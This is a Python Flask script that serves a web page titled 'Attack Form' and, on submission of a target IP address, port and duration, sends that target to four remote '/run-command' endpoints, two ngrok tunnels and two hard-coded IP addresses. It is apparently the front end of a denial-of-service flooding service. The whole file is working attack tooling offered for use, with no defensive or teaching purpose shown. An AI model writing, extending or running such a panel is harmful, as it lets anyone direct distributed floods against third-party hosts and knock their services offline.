from flask import Flask, request, render_template_string
from pyngrok import ngrok
import logging
import requests

app = Flask(__name__)

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Ngrok URLs and headers
NGROK_URL_1 = "https://7c16-4-188-242-224.ngrok-free.app/run-command"
NGROK_URL_2 = "https://1c84-4-213-100-131.ngrok-free.app/run-command"
NGROK_HEADERS = {"ngrok-skip-browser-warning": "any_value"}

# Local URLs
LOCAL_URL_1 = "http://195.35.20.132:8000/run-command"
LOCAL_URL_2 = "http://77.37.45.104:8000/run-command"

html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Form</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            border: 2px solid white;
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid white;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: rgb(0, 255, 255);
            color: black;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="/attack" method="post">
            <label for="ip">IP Address:</label><br>
            <input type="text" id="ip" name="ip"><br>
            <label for="port">Port:</label><br>
            <input type="number" id="port" name="port"><br>
            <label for="duration">Duration (seconds):</label><br>
            <input type="number" id="duration" name="duration"><br>
            <input type="submit" value="Launch Attack">
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return html_content

@app.route('/attack', methods=['POST'])
def attack():
    try:
        target_ip = request.form['ip']
        target_port = request.form['port']
        duration = request.form['duration']

        # Attack using Ngrok URLs
        ngrok_response_1 = run_attack_command(NGROK_URL_1, NGROK_HEADERS, target_ip, target_port, duration)
        logging.info(f"Ngrok Attack response 1: {ngrok_response_1}")

        ngrok_response_2 = run_attack_command(NGROK_URL_2, NGROK_HEADERS, target_ip, target_port, duration)
        logging.info(f"Ngrok Attack response 2: {ngrok_response_2}")

        # Attack using Local URLs
        local_response_1 = run_attack_command(LOCAL_URL_1, {}, target_ip, target_port, duration)
        logging.info(f"Local Attack response 1: {local_response_1}")

        local_response_2 = run_attack_command(LOCAL_URL_2, {}, target_ip, target_port, duration)
        logging.info(f"Local Attack response 2: {local_response_2}")

        return "Attack command sent to all URLs."
    except Exception as e:
        logging.error(f"Error in /attack endpoint: {e}")
        return "Error in processing attack command."

def run_attack_command(url, headers, target_ip, target_port, duration):
    try:
        params = {"ip": target_ip, "port": target_port, "time": duration}
        response = requests.get(url, headers=headers, params=params)
        return response.json()
    except Exception as e:
        logging.error(f"Error in run_attack_command: {e}")
        return {"error": str(e)}

if __name__ == '__main__':
    # Start the Flask app on the VPS IP address and desired port
    app.run(host='0.0.0.0', port=8000)
